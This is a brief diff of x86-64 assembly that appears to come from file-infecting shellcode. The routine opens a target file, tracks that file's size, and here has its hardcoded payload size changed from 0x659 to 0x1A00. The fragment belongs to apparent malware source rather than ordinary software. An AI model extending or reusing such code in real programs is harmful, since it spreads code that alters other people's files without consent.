@@ -181,7 +181,7 @@ _openCurrentFile:
 	xchg 	rdi, r13			; *** r13 : size of target file ***
 	push 	r12
 	xor 	r12, r12
-	add 	r12, 0x659 			; *** r12: size of this shellcode (hardcoded) ***
+	add 	r12, 0x1A00 			; *** r12: size of this shellcode (hardcoded) ***
 	xchg 	r14, rdi 
 	pop 	r14				; *** r14: HANDLE hFile ***
 	xor 	rdi, rdi 			; *** rdi: 0 ***
